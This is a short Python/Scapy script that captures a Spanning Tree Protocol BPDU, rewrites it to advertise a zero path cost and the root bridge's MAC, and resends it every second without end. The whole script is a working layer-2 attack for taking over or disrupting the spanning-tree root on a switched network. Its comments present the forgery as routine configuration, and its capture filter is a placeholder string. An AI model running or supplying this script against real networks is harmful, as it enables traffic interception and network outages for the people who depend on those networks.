from scapy.all import *
packet=sniff(filter="well known mac address",count=1)
# Set the path cost to 0, indicating that this switch considers itself the root 
# or has a direct, optimal connection to the root switch in the spanning tree configuration.
packet[0].pathcost = 0

# Set the bridge MAC address to the root MAC address, possibly during the process
# of handling a BPDU in the Spanning Tree Protocol (STP). This ensures the bridge
# recognizes or propagates the root bridge's MAC address as part of the network's 
# spanning tree configuration.
packet[0].bridgemac=packet[0].rootmac
# set port id to 1 
packet[0].portid=1

while (True):
    # Pause execution for 1 second before sending the packet.
    time.sleep(1)
    # Display the details of the first packet in the list for debugging/monitoring purposes.
    packet[0].show()
    # Send the first packet in the list. The loop=0 parameter ensures the packet is sent once.
    # The verbose=1 parameter enables detailed output of the sending process.
    sendp(packet[0],loop=0,verbose=1)